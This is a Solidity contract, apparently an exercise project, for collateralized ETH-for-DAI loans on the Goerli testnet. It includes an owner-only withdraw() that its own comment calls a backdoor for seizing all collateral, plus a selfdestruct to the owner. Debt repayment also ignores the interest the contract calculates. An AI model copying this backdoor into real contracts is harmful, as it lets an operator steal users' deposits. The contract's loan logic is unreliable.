// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

//import "hardhat/console.sol";
import "./interfaces/ICollateralizedLeverage.sol";
import "../node_modules/@openzeppelin/contracts/access/Ownable.sol";
import "../node_modules/@openzeppelin/contracts/interfaces/IERC20.sol";

contract CollateralizedLeverage is Ownable, ICollateralizedLeverage {
    // hardcoded, could be injected in ctor
    uint256 public constant DAI_ETH_MULTIPLIER = 1294;
    uint256 public constant MONTHLY_INTEREST_RATE = 10;
    uint256 public constant MONTHLY_DELAYED_INTEREST_RATE = 5;
    // goerli DAI address
    IERC20 constant DAI_TOKEN =
        IERC20(address(0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844));

    mapping(address => LoanRecord) private loanRecords;

    // Borrower Functions
    function newLoanRequest(uint256 _periodInYears) external payable override {
        require(_periodInYears >= 1, "at least 1 year");
        require(msg.value >= 0.01 ether, "at least 0.01 eth");
        LoanRecord storage _newLoanRecord = loanRecords[msg.sender];
        require(
            _newLoanRecord.status == uint8(LoanStatus.UNDEFINED) ||
                _newLoanRecord.status == uint8(LoanStatus.COMPLETED),
            "invalid state"
        );
        _newLoanRecord.status = uint8(LoanStatus.REQUESTED);
        _newLoanRecord.amount = msg.value;
        _newLoanRecord.periodInYears = _periodInYears;
        _newLoanRecord.startTime = block.timestamp;
        _newLoanRecord.lender = address(this);
        emit NewLoanRequest(msg.sender, msg.value, _periodInYears);
    }

    function currentDebt() external view override returns (uint256) {
        LoanRecord storage _loanRecord = loanRecords[msg.sender];
        require(
            _loanRecord.status == uint8(LoanStatus.ACTIVE),
            "invalid state"
        );
        return
            _calculateDebt(
                _loanRecord.amount,
                _loanRecord.startTime,
                _loanRecord.periodInYears * 12
            );
    }

    function payDebt() external override {
        LoanRecord storage _loanRecord = loanRecords[msg.sender];
        require(
            _loanRecord.status == uint8(LoanStatus.ACTIVE),
            "invalid state"
        );
        // simple re-entrancy guard
        _loanRecord.status = uint8(LoanStatus.COMPLETED);

        // send DAI debt to lender
        uint256 _amountToBeSent = calculateDaiFromCollateralAmount(
            _loanRecord.amount
        );
        bool success1 = DAI_TOKEN.transferFrom(
            msg.sender,
            _loanRecord.lender,
            _amountToBeSent
        );
        require(success1, "not approved");

        // send collateral to borrower
        (bool success2, ) = payable(msg.sender).call{value: _loanRecord.amount}(
            ""
        );
        require(success2, "can not send collateral back");
        emit LoanCompleted(msg.sender, _loanRecord.lender);
    }

    // Lender Functions
    function acceptLoanRequest(address _requester) external override {
        LoanRecord storage _loanRecord = loanRecords[_requester];
        require(
            _loanRecord.status == uint8(LoanStatus.REQUESTED),
            "invalid state"
        );
        // simple re-entrancy guard
        // btw, re-entrancy doesn't make sense for the caller
        _loanRecord.status = uint8(LoanStatus.ACTIVE);
        _loanRecord.startTime = block.timestamp;
        _loanRecord.lender = msg.sender;
        uint256 _amountToBeSent = calculateDaiFromCollateralAmount(
            _loanRecord.amount
        );
        bool success = DAI_TOKEN.transferFrom(
            msg.sender,
            _requester,
            _amountToBeSent
        );
        require(success, "not approved");
        emit LoanRequestAccepted(_requester, msg.sender);
    }

    function isCapturable(address _borrower)
        external
        view
        override
        returns (bool)
    {
        LoanRecord storage _loanRecord = loanRecords[_borrower];
        require(_loanRecord.lender == msg.sender, "not lender");
        require(
            _loanRecord.status == uint8(LoanStatus.ACTIVE),
            "invalid state"
        );
        return
            _isCapturable(
                _loanRecord.amount,
                _loanRecord.startTime,
                _loanRecord.periodInYears * 12
            );
    }

    function captureCollateral(address _borrower) external override {
        LoanRecord storage _loanRecord = loanRecords[_borrower];
        require(_loanRecord.lender == msg.sender, "not lender");
        require(
            _loanRecord.status == uint8(LoanStatus.ACTIVE),
            "invalid state"
        );
        require(
            _isCapturable(
                _loanRecord.amount,
                _loanRecord.startTime,
                _loanRecord.periodInYears * 12
            ),
            "not capturable"
        );
        // simple re-entrancy guard
        _loanRecord.status = uint8(LoanStatus.COMPLETED);
        // send collateral to lender
        (bool success, ) = payable(msg.sender).call{value: _loanRecord.amount}(
            ""
        );
        require(success);
        emit LoanCaptured(_borrower, msg.sender);
    }

    // Views
    function viewLoanRecord(address _borrower)
        external
        view
        override
        returns (LoanRecord memory)
    {
        LoanRecord storage _loanRecord = loanRecords[_borrower];
        return _loanRecord;
    }

    // Private methods

    // DAI worth half of the collateral amount
    function calculateDaiFromCollateralAmount(uint256 _collateralAmount)
        private
        pure
        returns (uint256)
    {
        return uint256(_collateralAmount / 2) * DAI_ETH_MULTIPLIER;
    }

    // simple interest rate calculation
    function _calculateDebt(
        uint256 _collateralAmount,
        uint256 _startTime,
        uint256 _periodInMonths
    ) private view returns (uint256) {
        uint256 _amount = calculateDaiFromCollateralAmount(_collateralAmount);
        uint256 _timePassedInMonths = (block.timestamp - _startTime) /
            60 /
            60 /
            24 /
            30;
        // simple interest
        _amount =
            _amount +
            (_amount / MONTHLY_INTEREST_RATE) *
            _timePassedInMonths;

        // if delayed, add more
        if (_timePassedInMonths > _periodInMonths) {
            _amount =
                _amount +
                (_amount / MONTHLY_DELAYED_INTEREST_RATE) *
                (_timePassedInMonths - _periodInMonths);
        }
        return _amount;
    }

    function _isCapturable(
        uint256 _collateralAmount,
        uint256 _startTime,
        uint256 _periodInMonths
    ) private view returns (bool) {
        uint256 _currentDebtInDAI = _calculateDebt(
            _collateralAmount,
            _startTime,
            _periodInMonths
        );
        return _collateralAmount * DAI_ETH_MULTIPLIER < _currentDebtInDAI;
    }

    // CONTRACT OWNER OPERATIONS
    // this method is a backdoor for contract owner
    // owner can capture all collateralized ethers
    function withdraw() external onlyOwner {
        (bool success, ) = payable(owner()).call{value: address(this).balance}(
            ""
        );
        require(success);
    }

    receive() external payable {}

    fallback() external payable {}

    function terminate() external onlyOwner {
        selfdestruct(payable(owner()));
    }
}
